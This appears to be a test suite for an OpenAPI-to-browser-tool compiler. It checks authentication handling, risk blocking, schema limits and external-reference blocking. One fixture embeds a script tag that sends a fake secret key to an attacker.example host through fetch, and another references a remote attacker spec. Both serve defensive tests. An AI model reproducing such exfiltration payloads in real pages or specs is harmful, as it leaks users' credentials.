import test from "node:test";
import assert from "node:assert/strict";
import { CapabilityPlanSchema, canonicalizeCapabilityPlans } from "../../capability-ir/src/plan.ts";
import { compileWebMcpRelease } from "../../compiler/src/compiler.ts";
import { compileOpenApi, compileOpenApiWithGrouping, parseOpenApiDocument, validateOpenApiSource } from "./compile.ts";

const compileOptions = {
  targetOrigin: "https://widgets.example",
  testPageUrl: "https://widgets.example/review/openapi",
  environment: "test" as const,
  evidenceReference: `urn:sha256:${"a".repeat(64)}`,
};

test("generates distinct complete canonical plans from arbitrary OpenAPI operations", () => {
  const document = {
    openapi: "3.1.0",
    servers: [{ url: "/api" }],
    paths: {
      "/v1/widgets/{widget-id}": {
        get: {
          operationId: "LookupWidget!",
          parameters: [
            { name: "widget-id", in: "path", required: true, schema: { type: "string", maxLength: 32 } },
            { name: "locale", in: "query", schema: { type: "string", maxLength: 12 } },
            { name: "X-Client-Trace", in: "header", required: true, schema: { type: "string", maxLength: 36 } },
          ],
          responses: {
            "200": { description: "ok", content: { "application/json": { schema: {
              type: "object", required: ["id"], properties: { id: { type: "string", maxLength: 32 } },
            } } } },
            "404": { description: "missing" },
          },
        },
      },
      "/v1/widgets": {
        post: {
          operationId: "Create something arbitrary",
          "x-page2webmcp": { reviewed: true, effect: "mutation", riskTier: "R1", reversible: true },
          requestBody: { required: true, content: { "application/x-www-form-urlencoded": { schema: {
            type: "object", required: ["name"], properties: { name: { type: "string", maxLength: 80 } },
          } } } },
          responses: { "201": { description: "created", content: { "application/json": { schema: {
            type: "object", required: ["id"], properties: { id: { type: "string", maxLength: 32 } },
          } } } } },
        },
      },
    },
  };

  const result = compileOpenApi(document, compileOptions);
  assert.equal(result.plans.length, 2);
  assert.deepEqual(result.diagnostics, []);
  assert.equal(new Set(result.plans.map((plan) => plan.tool.name)).size, 2);
  assert.match(result.plans[0]!.tool.name, /^[a-z][a-z0-9_]{0,63}$/);
  assert.deepEqual(result.plans, compileOpenApi(document, compileOptions).plans);
  for (const plan of result.plans) {
    assert.deepEqual(CapabilityPlanSchema.parse(plan), canonicalizeCapabilityPlans([plan])[0]);
    assert.equal(plan.targetOrigin, compileOptions.targetOrigin);
    assert.deepEqual(plan.evidence, [{ source: "openapi", reference: compileOptions.evidenceReference }]);
  }
  const read = result.plans.find((plan) => plan.effects.kind === "read")!;
  assert.deepEqual(read.request, {
    adapter: "json_api", method: "GET", pathTemplate: "/api/v1/widgets/{path_widget_id}",
    path: { path_widget_id: "path_widget_id" }, query: { locale: "query_locale" },
    headers: { "x-client-trace": "header_x_client_trace" }, body: {}, optional: ["query_locale"],
    bodyEncoding: "json",
  });
  assert.equal(read.response.adapter, "json_api");
  if (read.response.adapter !== "json_api") throw new Error("expected JSON response adapter");
  assert.deepEqual(read.response.errorMappings, { "404": "STALE_TARGET", default: "TARGET_ERROR" });
  const mutation = result.plans.find((plan) => plan.effects.kind === "mutation")!;
  assert.equal(mutation.request.adapter, "json_api");
  assert.equal(mutation.request.bodyEncoding, "form_urlencoded");
  assert.equal(mutation.effects.confirmation, "always");
  assert.doesNotThrow(() => compileWebMcpRelease(result.plans));
});

test("classifies browser-safe authentication and diagnoses server-only or ambiguous operations", () => {
  const operation = (security: unknown, operationId: string) => ({ operationId, security, responses: {
    "200": { description: "ok", content: { "application/json": { schema: {
      type: "object", required: ["ok"], properties: { ok: { type: "boolean" } },
    } } } },
  } });
  const document = {
    openapi: "3.0.3",
    components: { securitySchemes: {
      session: { type: "apiKey", in: "cookie", name: "sid" },
      oauth: { type: "oauth2", flows: { authorizationCode: { authorizationUrl: "https://identity.example/authorize", tokenUrl: "https://identity.example/token", scopes: { "widget:read": "read" } } } },
      headerKey: { type: "apiKey", in: "header", name: "X-API-Key" },
      machine: { type: "oauth2", flows: { clientCredentials: { tokenUrl: "https://identity.example/token", scopes: {} } } },
      password: { type: "oauth2", flows: { password: { tokenUrl: "https://identity.example/token", scopes: {} } } },
    } },
    paths: {
      "/public": { get: operation([], "Public") },
      "/cookie": { get: operation([{ session: [] }], "Cookie") },
      "/oauth": { get: operation([{ oauth: ["widget:read"] }], "OAuth") },
      "/key": { get: operation([{ headerKey: [] }], "Key") },
      "/machine": { get: operation([{ machine: [] }], "Machine") },
      "/password": { get: operation([{ password: [] }], "Password") },
      "/ambiguous": { get: operation([{ session: [] }, { oauth: [] }], "Ambiguous") },
      "/delete": { delete: operation([], "HarmlessLookingName") },
    },
  };
  const result = compileOpenApi(document, compileOptions);
  assert.deepEqual(result.plans.map((plan) => [plan.request.adapter === "json_api" ? plan.request.pathTemplate : "", plan.authentication]), [
    ["/cookie", { mode: "same_origin_cookie", requiredScopes: [] }],
    ["/oauth", { mode: "browser_oauth", requiredScopes: ["widget:read"] }],
    ["/public", { mode: "public", requiredScopes: [] }],
  ]);
  assert.deepEqual(result.diagnostics, [
    { code: "AUTHENTICATION_AMBIGUOUS", operationKey: "GET /ambiguous" },
    { code: "SERVER_ADAPTER_REQUIRED", operationKey: "GET /key", reason: "api_key_header" },
    { code: "SERVER_ADAPTER_REQUIRED", operationKey: "GET /machine", reason: "oauth_client_credentials" },
    { code: "SERVER_ADAPTER_REQUIRED", operationKey: "GET /password", reason: "oauth_password" },
    { code: "UNSUPPORTED_HTTP_METHOD", operationKey: "DELETE /delete" },
  ]);
});

test("never downgrades explicit side-effect or high-risk indicators to a safe browser capability", () => {
  const success = { "200": { description: "ok", content: { "application/json": { schema: { type: "boolean" } } } } };
  const result = compileOpenApi({ openapi: "3.1.0", paths: {
    "/side-effecting-read": { get: {
      "x-page2webmcp": { reviewed: true, effect: "mutation", riskTier: "R1", reversible: true },
      responses: success,
    } },
    "/irreversible": { post: {
      "x-page2webmcp": { reviewed: true, effect: "mutation", riskTier: "R3", reversible: false },
      responses: success,
    } },
  } }, compileOptions);
  assert.deepEqual(result.plans, []);
  assert.deepEqual(result.diagnostics, [
    { code: "EFFECT_REVIEW_REQUIRED", operationKey: "GET /side-effecting-read" },
    { code: "HIGH_RISK_OPERATION_BLOCKED", operationKey: "POST /irreversible" },
  ]);
});

test("uses one bounded grouping call and rejects incomplete or invented groupings", async () => {
  const document = { openapi: "3.2.0", paths: {
    "/alpha": { get: { operationId: "Alpha", responses: { "200": { description: "ok", content: { "application/json": { schema: { type: "boolean" } } } } } } },
    "/beta": { get: { operationId: "Beta", responses: { "200": { description: "ok", content: { "application/json": { schema: { type: "boolean" } } } } } } },
  } };
  let calls = 0;
  const grouped = await compileOpenApiWithGrouping(document, compileOptions, { group: async (request) => {
    calls += 1;
    assert.deepEqual(request.operations.map(({ key }) => key), ["GET /alpha", "GET /beta"]);
    return { groups: [{ name: "lookup", operations: ["GET /alpha", "GET /beta"] }] };
  } });
  assert.equal(calls, 1);
  assert.deepEqual(grouped.groups, [{ name: "lookup", operations: ["GET /alpha", "GET /beta"] }]);
  await assert.rejects(() => compileOpenApiWithGrouping(document, compileOptions, {
    group: async () => ({ groups: [{ name: "invented", operations: ["GET /unknown"] }] }),
  }), /INVALID_OPENAPI_GROUPING/);
  await assert.rejects(() => compileOpenApiWithGrouping(document, compileOptions, {
    group: async () => ({ groups: [{ name: "x".repeat(40_000), operations: ["GET /alpha", "GET /beta"] }] }),
  }), /INVALID_OPENAPI_GROUPING/);
});

test("diagnoses cookie parameters, unsupported schema constraints, and recursive runtime schemas", () => {
  const response = { "200": { description: "ok", content: { "application/json": { schema: { type: "boolean" } } } } };
  const result = compileOpenApi({ openapi: "3.1.0", paths: {
    "/cookie": { get: { parameters: [{ in: "cookie", name: "tenant", schema: { type: "string", maxLength: 20 } }], responses: response } },
    "/format": { get: { parameters: [{ in: "query", name: "id", required: true, schema: { type: "string", maxLength: 40, format: "uuid" } }], responses: response } },
    "/minimum-properties": { get: { responses: { "200": { description: "ok", content: { "application/json": { schema: {
      type: "object", minProperties: 1, properties: { ok: { type: "boolean" } },
    } } } } } } },
    "/numeric-enum": { get: { parameters: [{ in: "query", name: "level", required: true, schema: { type: "integer", enum: [1, 2] } }], responses: response } },
    "/pattern": { get: { parameters: [{ in: "query", name: "q", required: true, schema: { type: "string", maxLength: 20, pattern: "^[a-z]+$" } }], responses: response } },
    "/secret-header": { get: { parameters: [{ in: "header", name: "X-Client-Secret", required: true, schema: { type: "string", maxLength: 20 } }], responses: response } },
    "/tree": { get: { responses: { "200": { description: "ok", content: { "application/json": { schema: { $ref: "#/components/schemas/Node" } } } } } } },
  }, components: { schemas: { Node: { type: "object", properties: { child: { $ref: "#/components/schemas/Node" } } } } } }, compileOptions);
  assert.deepEqual(result.diagnostics.map(({ code, operationKey }) => [code, operationKey]), [
    ["UNSUPPORTED_COOKIE_PARAMETER", "GET /cookie"],
    ["UNSUPPORTED_SCHEMA", "GET /format"],
    ["UNSUPPORTED_SCHEMA", "GET /minimum-properties"],
    ["UNSUPPORTED_SCHEMA", "GET /numeric-enum"],
    ["UNSUPPORTED_SCHEMA", "GET /pattern"],
    ["SERVER_ADAPTER_REQUIRED", "GET /secret-header"],
    ["UNSUPPORTED_SCHEMA", "GET /tree"],
  ]);
  assert.deepEqual(result.diagnostics.find(({ operationKey }) => operationKey === "GET /secret-header"), {
    code: "SERVER_ADAPTER_REQUIRED", operationKey: "GET /secret-header", reason: "unsafe_header_parameter",
  });
  assert.deepEqual(result.plans, []);
});

test("rejects Reference Objects with behavior-changing siblings", () => {
  const document = {
    openapi: "3.1.0",
    components: {
      requestBodies: {
        Create: { content: { "application/json": { schema: {
          type: "object", required: ["name"], properties: { name: { type: "string", maxLength: 20 } },
        } } } },
      },
    },
    paths: {
      "/widgets": {
        post: {
          "x-page2webmcp": { reviewed: true, effect: "mutation", riskTier: "R1", reversible: true },
          requestBody: {
            $ref: "#/components/requestBodies/Create",
            content: { "application/x-www-form-urlencoded": { schema: {
              type: "object", required: ["title"], properties: { title: { type: "string", maxLength: 20 } },
            } } },
          },
          responses: { "201": { description: "created", content: { "application/json": { schema: { type: "boolean" } } } } },
        },
      },
    },
  };
  const result = compileOpenApi(document, compileOptions);
  assert.deepEqual(result.plans, []);
  assert.deepEqual(result.diagnostics, [{ code: "MALFORMED_OPERATION", operationKey: "POST /widgets" }]);
});

test("rejects request-body optionality that the flat canonical mapping cannot express exactly", () => {
  const response = { "201": { description: "created", content: { "application/json": { schema: { type: "boolean" } } } } };
  const mutation = (requestBody: unknown) => ({
    "x-page2webmcp": { reviewed: true, effect: "mutation", riskTier: "R1", reversible: true },
    requestBody,
    responses: response,
  });
  const bodySchema = (required: string[]) => ({
    type: "object", required, properties: { name: { type: "string", maxLength: 20 } },
  });
  const result = compileOpenApi({ openapi: "3.1.0", paths: {
    "/conditionally-required": { post: mutation({ content: { "application/json": { schema: bodySchema(["name"]) } } }) },
    "/required-empty": { post: mutation({ required: true, content: { "application/json": { schema: bodySchema([]) } } }) },
  } }, compileOptions);
  assert.deepEqual(result.plans, []);
  assert.deepEqual(result.diagnostics, [
    { code: "UNSUPPORTED_REQUEST_BODY", operationKey: "POST /conditionally-required" },
    { code: "UNSUPPORTED_REQUEST_BODY", operationKey: "POST /required-empty" },
  ]);
});

test("rejects ambiguous, templated, or cross-origin OpenAPI servers", () => {
  const operation = { responses: { "200": { description: "ok", content: { "application/json": { schema: { type: "boolean" } } } } } };
  for (const [servers, code] of [
    [[{ url: "https://api.other.example" }], "SERVER_ORIGIN_MISMATCH"],
    [[{ url: "https://widgets.example/{tenant}" }], "UNSUPPORTED_SERVER"],
    [[{ url: "/one" }, { url: "/two" }], "UNSUPPORTED_SERVER"],
  ] as const) {
    const result = compileOpenApi({ openapi: "3.1.0", servers: [...servers], paths: { "/widgets": { get: operation } } }, compileOptions);
    assert.deepEqual(result.diagnostics, [{ code, operationKey: "GET /widgets" }]);
    assert.deepEqual(result.plans, []);
  }
});

test("never copies hostile descriptions, examples, or secret-shaped operation identifiers into plans", () => {
  const secret = "sk-live-super-secret-value";
  const document = { openapi: "3.1.0", paths: { "/safe": { get: {
    operationId: `password-${secret}`,
    summary: `<script>fetch('https://attacker.example/?${secret}')</script>`,
    parameters: [{ name: "q", in: "query", required: true, example: secret, schema: { type: "string", maxLength: 10 } }],
    responses: {
      "200": {
        description: secret,
        content: { "application/json": { example: { token: secret }, schema: { type: "boolean" } } },
      },
    },
  } } } };
  const result = compileOpenApi(document, compileOptions);
  const serialized = JSON.stringify(result);
  assert.equal(result.plans.length, 1);
  assert.doesNotMatch(serialized, /sk-live|super-secret|password/i);
  assert.match(result.plans[0]!.tool.name, /^get_operation_[a-f0-9]{8}$/);
  assert.doesNotMatch(compileWebMcpRelease(result.plans).code, /sk-live|super-secret/i);
});

test("parses JSON and YAML OpenAPI 3.0 through 3.2 while blocking external references", () => {
  const yaml = `openapi: 3.2.0
paths:
  /api/orders:
    get:
      operationId: findOrder
      summary: Find an order
`;
  assert.equal(parseOpenApiDocument(yaml, "yaml").openapi, "3.2.0");
  assert.equal(parseOpenApiDocument('{"openapi":"3.0.3","paths":{}}', "json").openapi, "3.0.3");
  assert.throws(() => parseOpenApiDocument('openapi: 3.1.0\npaths:\n  /x:\n    $ref: https://attacker.example/spec.yaml', "yaml"), /EXTERNAL_REFERENCE_BLOCKED/);
  assert.throws(() => parseOpenApiDocument('{"openapi":"3.1.0"}', "json"), /INVALID_OPENAPI_DOCUMENT/);
});

test("validates provider input with pinned Redocly structural rules before compilation", async () => {
  for (const version of ["3.0.3", "3.1.1", "3.2.0"]) {
    const source = JSON.stringify({ openapi: version, info: { title: "Widget API", version: "1" }, paths: {} });
    assert.equal((await validateOpenApiSource(source, "json")).openapi, version);
  }
  await assert.rejects(
    () => validateOpenApiSource('{"openapi":"3.1.0","paths":{}}', "json"),
    /^Error: OPENAPI_SCHEMA_INVALID$/,
  );
});

test("allows recursive local schemas while rejecting resource-exhaustion documents", () => {
  assert.equal(
    parseOpenApiDocument('{"openapi":"3.1.0","paths":{},"components":{"schemas":{"Node":{"type":"object","properties":{"child":{"$ref":"#/components/schemas/Node"}}}}}}', "json").openapi,
    "3.1.0"
  );
  const deepYaml = `openapi: 3.1.0\npaths:\n${Array.from({ length: 80 }, (_, depth) => `${"  ".repeat(depth + 1)}nested:`).join("\n")}\n${"  ".repeat(81)}value: x`;
  assert.throws(() => parseOpenApiDocument(deepYaml, "yaml"), /OPENAPI_RESOURCE_LIMIT_EXCEEDED/);
});

test("rejects external, invalid, oversized, and excessive-node OpenAPI input without exposing source", () => {
  assert.throws(() => parseOpenApiDocument('{"openapi":"3.1.0","paths":{"/x":{"$ref":"other.yaml#/x"}}}', "json"), /^Error: EXTERNAL_REFERENCE_BLOCKED$/);
  assert.throws(() => parseOpenApiDocument('{"openapi":"3.1.0","paths":{"/x":{"$ref":"#/missing"}}}', "json"), /^Error: LOCAL_REFERENCE_INVALID$/);
  assert.throws(() => parseOpenApiDocument(`{"openapi":"3.1.0","paths":{},"x":"${"x".repeat(1_000_000)}"}`, "json"), /^Error: OPENAPI_RESOURCE_LIMIT_EXCEEDED$/);
  const excessiveNodes = JSON.stringify({ openapi: "3.1.0", paths: {}, values: Array.from({ length: 10_100 }, (_, index) => index) });
  assert.throws(() => parseOpenApiDocument(excessiveNodes, "json"), /^Error: OPENAPI_RESOURCE_LIMIT_EXCEEDED$/);
});

test("visits acyclic local-reference DAGs once", () => {
  const components: Record<string, unknown> = {};
  for (let index = 0; index < 15; index++) {
    const next = `#/components/node${index + 1}`;
    components[`node${index}`] = index === 14 ? { type: "string" } : { left: { $ref: next }, right: { $ref: next } };
  }
  const source = JSON.stringify({ openapi: "3.1.0", paths: {}, components });
  assert.equal(parseOpenApiDocument(source, "json").openapi, "3.1.0");
});

test("allows bounded local references into OpenAPI arrays", () => {
  const source = JSON.stringify({
    openapi: "3.1.0",
    paths: { "/x": { get: { parameters: [{ $ref: "#/components/parameters/0" }] } } },
    components: { parameters: [{ name: "limit", in: "query" }] }
  });
  assert.equal(parseOpenApiDocument(source, "json").openapi, "3.1.0");
});

test("accepts bounded YAML aliases that share a safe object", () => {
  const source = `openapi: 3.1.0
paths: {}
components:
  primary: &parameter
    name: limit
    in: query
  alias: *parameter
`;
  assert.equal(parseOpenApiDocument(source, "yaml").openapi, "3.1.0");
});

test("rejects malformed path items and operations and unsupported OpenAPI versions", () => {
  assert.throws(() => parseOpenApiDocument('{"openapi":"3.1.0","paths":{"/x":null}}', "json"), /^Error: INVALID_OPENAPI_DOCUMENT$/);
  assert.throws(() => parseOpenApiDocument('{"openapi":"3.1.0","paths":{"/x":{"get":null}}}', "json"), /^Error: INVALID_OPENAPI_DOCUMENT$/);
  assert.throws(() => parseOpenApiDocument('{"openapi":"3.1.0","paths":{"/x":{"post":"not-an-operation"}}}', "json"), /^Error: INVALID_OPENAPI_DOCUMENT$/);
  assert.throws(() => parseOpenApiDocument('{"openapi":"3.1","paths":{}}', "json"), /^Error: INVALID_OPENAPI_DOCUMENT$/);
  assert.throws(() => parseOpenApiDocument('{"openapi":"3.3.0","paths":{}}', "json"), /^Error: UNSUPPORTED_OPENAPI_VERSION$/);
});

test("decodes RFC 6901 local reference fragments and rejects malformed escapes", () => {
  const valid = '{"openapi":"3.1.0","paths":{"/x":{"$ref":"#/components/schemas/Foo%20Bar"}},"components":{"schemas":{"Foo Bar":{"type":"object"}}}}';
  assert.equal(parseOpenApiDocument(valid, "json").openapi, "3.1.0");
  assert.throws(() => parseOpenApiDocument('{"openapi":"3.1.0","paths":{"/x":{"$ref":"#/components/schemas/%ZZ"}},"components":{"schemas":{}}}', "json"), /^Error: LOCAL_REFERENCE_INVALID$/);
  assert.throws(() => parseOpenApiDocument('{"openapi":"3.1.0","paths":{"/x":{"$ref":"#/components/schemas/a~2b"}},"components":{"schemas":{"a~2b":{"type":"object"}}}}', "json"), /^Error: LOCAL_REFERENCE_INVALID$/);
});

test("allows x-* Paths Object extensions while validating actual path items", () => {
  assert.equal(parseOpenApiDocument('{"openapi":"3.1.0","paths":{"x-gateway":{"enabled":true},"/x":{"get":{"operationId":"findOrder"}}}}', "json").openapi, "3.1.0");
  assert.throws(() => parseOpenApiDocument('{"openapi":"3.1.0","paths":{"not-a-path":{}}}', "json"), /^Error: INVALID_OPENAPI_DOCUMENT$/);
});
